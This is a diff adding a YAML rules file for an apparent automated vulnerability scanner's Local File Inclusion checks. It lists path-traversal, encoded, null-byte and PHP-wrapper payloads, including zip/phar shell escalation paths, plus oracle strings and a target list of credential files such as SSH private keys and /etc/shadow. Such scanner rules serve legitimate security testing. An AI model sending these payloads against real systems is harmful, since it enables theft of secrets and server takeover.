@@ -1,0 +1,193 @@
+# knowledge/rules/lfi_rules.yaml
+# SAM-∞ v28-Ω  Local File Inclusion (LFI) Detection Rules
+# ──────────────────────────────────────────────────────────────────────────────
+
+meta:
+  vuln_type: lfi
+  version: "1.0.0"
+  last_updated: "2026-10-27"
+  description: "LFI 检测规则：路径遍历 payload；差分 echo 验证（/etc/passwd 精确内容）；PHP wrapper"
+
+default_oracle_pattern: "root:x:0:0:"
+oracle_type: "differential_echo"
+note: "LFI 验证：响应中必须包含 /etc/passwd 实际内容特征字符串，不得以页面报错作为证明"
+
+# ── Oracle 验证模式 ────────────────────────────────────────────────────────────
+oracle_patterns:
+  linux:
+    etc_passwd: "root:x:0:0:"          # /etc/passwd 首行特征（精确字符串）
+    etc_shadow: "root:\\$"              # /etc/shadow（需 root 权限）
+    proc_self: "/proc/self/environ"
+    ssh_key: "--BEGIN"              # SSH 私钥特征
+
+  windows:
+    boot_ini: "[boot loader]"          # C:\boot.ini
+    win_ini: "[fonts]"                 # C:\Windows\win.ini
+    system32: "\\[System32\\]"
+
+  php_source:
+    pattern: "<\\?php"                 # PHP 源码读取特征
+    note: "php://filter wrapper 读取 PHP 源码"
+
+# ── 路径遍历 payload ────────────────────────────────────────────────────────────
+payloads:
+  # ── 基础路径遍历 ─────────────────────────────────────────────────────────
+  - payload: "../../../etc/passwd"
+    oracle_pattern: "root:x:0:0:"
+    category: basic
+    depth: 3
+    confidence: 0.85
+
+  - payload: "../../../../etc/passwd"
+    oracle_pattern: "root:x:0:0:"
+    category: basic
+    depth: 4
+    confidence: 0.85
+
+  - payload: "../../../../../etc/passwd"
+    oracle_pattern: "root:x:0:0:"
+    category: basic
+    depth: 5
+    confidence: 0.85
+
+  - payload: "../../../../../../etc/passwd"
+    oracle_pattern: "root:x:0:0:"
+    category: basic
+    depth: 6
+    confidence: 0.85
+
+  - payload: "../../../../../../../etc/passwd"
+    oracle_pattern: "root:x:0:0:"
+    category: basic
+    depth: 7
+    confidence: 0.85
+
+  # ── 绝对路径 ──────────────────────────────────────────────────────────────
+  - payload: "/etc/passwd"
+    oracle_pattern: "root:x:0:0:"
+    category: absolute
+    confidence: 0.80
+
+  - payload: "/proc/self/environ"
+    oracle_pattern: "PATH="
+    category: absolute
+    confidence: 0.78
+
+  # ── URL 编码 ──────────────────────────────────────────────────────────────
+  - payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    oracle_pattern: "root:x:0:0:"
+    category: url_encoded
+    confidence: 0.82
+
+  - payload: "..%2f..%2f..%2fetc%2fpasswd"
+    oracle_pattern: "root:x:0:0:"
+    category: url_encoded
+    confidence: 0.82
+
+  # ── 双重 URL 编码 ─────────────────────────────────────────────────────────
+  - payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+    oracle_pattern: "root:x:0:0:"
+    category: double_url_encoded
+    confidence: 0.78
+
+  # ── 点点斜杠混淆 ──────────────────────────────────────────────────────────
+  - payload: "....//....//....//etc/passwd"
+    oracle_pattern: "root:x:0:0:"
+    category: obfuscated
+    confidence: 0.80
+
+  - payload: "....\/....\/....\/etc/passwd"
+    oracle_pattern: "root:x:0:0:"
+    category: obfuscated
+    confidence: 0.78
+
+  - payload: "..././..././..././etc/passwd"
+    oracle_pattern: "root:x:0:0:"
+    category: obfuscated
+    confidence: 0.78
+
+  # ── Windows 路径 ──────────────────────────────────────────────────────────
+  - payload: "..\\..\\..\\windows\\win.ini"
+    oracle_pattern: "[fonts]"
+    category: windows
+    confidence: 0.82
+
+  - payload: "..\\..\\.\\windows\\win.ini"
+    oracle_pattern: "[fonts]"
+    category: windows
+    confidence: 0.80
+
+  - payload: "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
+    oracle_pattern: "[fonts]"
+    category: windows_url_encoded
+    confidence: 0.78
+
+  # ── Null byte 截断（PHP 5.x）────────────────────────────────────────────
+  - payload: "../../../etc/passwd%00"
+    oracle_pattern: "root:x:0:0:"
+    category: null_byte
+    confidence: 0.70
+    note: "仅对 PHP 5.x 有效"
+
+  - payload: "../../../etc/passwd%00.jpg"
+    oracle_pattern: "root:x:0:0:"
+    category: null_byte
+    confidence: 0.68
+
+# ── PHP Wrapper 专项 ───────────────────────────────────────────────────────────
+php_wrappers:
+  filter_base64:
+    payload: "php://filter/convert.base64-encode/resource=/etc/passwd"
+    oracle_pattern: "cm9vdDp4OjA6MC4="   # base64("root:x:0:0") 前缀
+    confidence: 0.90
+    note: "读取 PHP 源码时将 /etc/passwd 替换为目标 PHP 文件路径"
+
+  filter_rot13:
+    payload: "php://filter/read=string.rot13/resource=/etc/passwd"
+    oracle_pattern: "ebbg:k:0:0:"        # rot13("root:x:0:0:")
+    confidence: 0.85
+
+  data_wrapper:
+    payload: "data://text/plain;base64,cm9vdDp4OjA6MA=="
+    oracle_pattern: "root:x:0"
+    confidence: 0.75
+    note: "需要 allow_url_include = On"
+
+  zip_wrapper:
+    payload: "zip:///var/www/html/upload/shell.zip#shell"
+    oracle_pattern: ""
+    confidence: 0.65
+    note: "需要先上传 zip 文件；RCE 升级路径"
+
+  phar_wrapper:
+    payload: "phar:///var/www/html/upload/shell.phar/shell"
+    oracle_pattern: ""
+    confidence: 0.65
+    note: "PHAR 反序列化升级路径"
+
+# ── 常见敏感文件目标 ────────────────────────────────────────────────────────────
+sensitive_files:
+  linux:
+    - "/etc/passwd"
+    - "/etc/shadow"
+    - "/etc/hosts"
+    - "/etc/hostname"
+    - "/proc/self/environ"
+    - "/proc/self/cmdline"
+    - "/proc/version"
+    - "/var/log/apache2/access.log"
+    - "/var/log/nginx/access.log"
+    - "/home/{username}/.ssh/id_rsa"
+    - "/root/.ssh/id_rsa"
+    - "/var/www/html/config.php"
+    - "/etc/mysql/my.cnf"
+
+  windows:
+    - "C:\\boot.ini"
+    - "C:\\Windows\\win.ini"
+    - "C:\\Windows\\System32\\drivers\\etc\\hosts"
+    - "C:\\inetpub\\wwwroot\\web.config"
+
+distilled_rules: []
+total_distilled_rules: 0
+last_updated: "2026-10-27"
